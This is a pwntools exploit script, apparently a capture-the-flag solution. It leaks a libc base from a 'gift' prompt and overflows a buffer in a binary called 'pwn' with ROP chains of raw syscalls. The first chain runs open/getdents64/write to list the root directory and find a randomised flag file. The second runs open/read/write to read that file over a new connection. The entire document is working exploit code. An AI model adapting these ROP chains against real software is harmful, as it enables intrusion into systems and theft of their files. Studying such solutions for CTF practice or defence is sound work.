from pwn import *
context(
    terminal = ['tmux','splitw','-h'],
    os = "linux",
    arch = "amd64",
    log_level="debug",
)
def debug(io):
    gdb.attach(io,
'''
'''
)

def OGW_ORW(io, libc_base, gadgets, mode, file):
    rax = libc_base + gadgets.rax.address
    rdi = libc_base + gadgets.rdi.address
    rsi = libc_base + gadgets.rsi.address
    rdx = libc_base + gadgets.rdx.address
    syscall = libc_base + libc.symbols["read"] + 0x10
    readable_adr = libc_base - 0x3000

    if mode == 'ogw':
        # read
        rop = p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x30) + p64(0x0)+ p64(syscall)
        # open
        rop+= p64(rax) + p64(0x2) + p64(rdi) + p64(readable_adr) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(0x0) + p64(syscall)
        # getdents64
        rop+= p64(rax) + p64(0xD9) + p64(rdi) + p64(3) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x100) + p64(0x0) + p64(syscall)
        # write
        rop+= p64(rax) + p64(0x1) + p64(rdi) + p64(1) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x702) + p64(0x0) + p64(syscall)

        io.sendline(b'\x00'*0x18 + rop)
        pause()
        io.sendline(file + b'\x00')

    if mode == 'orw':
        # read
        rop = p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x30) + p64(0x0) + p64(syscall)
        # open
        rop+= p64(rax) + p64(0x2) + p64(rdi) + p64(readable_adr) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(0x0) + p64(syscall)
        # read
        rop+= p64(rax) + p64(0x0) + p64(rdi) + p64(3) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x100) + p64(0x0) + p64(syscall)
        # write
        rop+= p64(rax) + p64(0x1) + p64(rdi) + p64(1) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x70) + p64(0x0) + p64(syscall)

        io.sendline(b'\x00'*0x18 + rop)
        pause()
        io.sendline(file + b'\x00')

def getio():
    if sys.argv[1] == 'local':
        return process("./pwn")
    elif sys.argv[1] == 'remote':
        return remote("127.0.0.1", 9999)

libc = ELF('./libc.so.6')
gadgets = ROP(libc)

io1 = getio()
# debug(io1)
io1.recvuntil(b'gift:')
libc_base = int(io1.recv(0xe),16) - 0x606f0
OGW_ORW(io1, libc_base, gadgets, 'ogw', b'/')
io1.recvuntil('flag')
rand = io1.recvuntil('\x00')

flagname = b'flag' + rand
io2 = getio()
io2.recvuntil(b'gift:')
libc_base = int(io2.recv(0xe),16) - 0x606f0
OGW_ORW(io2, libc_base, gadgets, 'orw', flagname)

io2.interactive()